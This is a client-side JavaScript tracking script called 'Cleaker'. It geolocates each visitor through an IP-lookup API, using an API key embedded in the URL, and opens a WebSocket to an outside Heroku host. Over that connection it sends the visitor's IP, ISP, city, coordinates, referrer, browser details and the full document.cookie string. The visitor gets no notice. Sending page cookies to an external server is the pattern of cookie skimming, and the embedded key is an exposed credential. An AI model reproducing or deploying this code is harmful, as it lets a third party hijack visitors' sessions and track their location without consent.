// CLEAKER LOVE - EVOLVE

$.getJSON("https://pro.ip-api.com/json/?callback=?&key=aGbt2iIuvD8OhJl", function(data) {
		//SET DATA READY
		//USE URL WS:// OR WSS:// (IF USING TLS)
		var ws = new WebSocket("wss://cleaker.herokuapp.com");
		//var ws = new WebSocket("ws://localhost:5000"); //RUNNING LOCAL
			ws.onopen = function(e){
			 console.log('Conected to Cleaker. 000');
			 document.getElementById("voice").style = "color: #cfafac";	
					}
		//most important part - incoming messages
		ws.onmessage = function(message) {
		 //try to parse JSON message. Because we know that the server always returns
		 //JSON this should work without any problem but we should make sure that
		 //the message is not chunked or otherwise damaged.
		 	 try {
				  var json = JSON.parse(message.data);
				  } catch (e) {
				    console.log('Not a valid JSON: ', message.data);
				    return;
				     }
		 //TYPES OF WS PACKETS FROM SERVER
			 if (json.type === 'cleakID'){ //first response from the server with user's color
				var myUUID = json.uuid;
				var cleaker ={    
						uuid: myUUID,
						onDate: new Date(),
						timezone:(new Date()).getTimezoneOffset()/60,
						returningVisitor: "no",
						//tdyvisits: 0,
						//ystvisits: 'x',
						//wklyVisits: 'x',
						//mnthlyVisits: 'x',
						//CookiesOn: 'yes',
						usrname: 'usrname',
						pushNotifications: 'yes',
						locationPath: window.location.pathname,
						locationOrigin: location.origin,
						usrCountry: data.country,
						usrRegion: data.region,
						usrISP: data.isp,
						usrCity: data.city,
						usrLat: data.lat,
						usrLon: data.lon,
						ipQuery: data.query,
						refer: document.referrer,
						previous: history.length,
						language: navigator.language,
						browserOnline: navigator.onLine,
						browser: navigator.platform,
						js: navigator.javaEnabled(),
						cookiesEnabled: navigator.cookieEnabled,
						cookies: document.cookie,
						mon: 'yes',
						sessionClosed: 'I am',
						sessionDuration:'00:00:00',
						number: '000000000000000000001'
						  };
					var cookieCleaker = JSON.stringify(cleaker);
					//createCookie('cleakerCookie', cookieCleaker, 21);
					ws.send(JSON.stringify({clkcd: 'onCleaker' , cleaker: cleaker}));
				        }
					}
						});
/*
neutonsartntec
    								 .-. .-')             ('-.    .-')    
                                     \  ( OO )          _(  OO)  ( OO ).  
   .-----.  .-'),-----.  .-'),-----. ,--. ,--.  ,-.-') (,------.(_)---\_) 
  '  .--./ ( OO'  .-.  '( OO'  .-.  '|  .'   /  |  |OO) |  .---'/    _ |  
  |  |('-. /   |  | |  |/   |  | |  ||      /,  |  |  \ |  |    \  :` `.  
 /_) |OO  )\_) |  |\|  |\_) |  |\|  ||     ' _) |  |(_/(|  '--.  '..`''.) 
 ||  |`-'|   \ |  | |  |  \ |  | |  ||  .   \  ,|  |_.' |  .--' .-._)   \ 
(_'  '--'\    `'  '-'  '   `'  '-'  '|  |\   \(_|  |    |  `---.\       / 
   `-----'      `-----'      `-----' `--' '--'  `--'    `------' `-----' 
we get to remember;
*/
						
						
						function createCookie(cname, cvalue, exdays) {
						  var d = new Date();
						  d.setTime(d.getTime() + (exdays*24*60*60*1000));
						  var expires = "expires="+ d.toUTCString();
						  document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
						}
		
	 
	 
// CLEAKER - THE VAULT - Handler
						
						
					
			
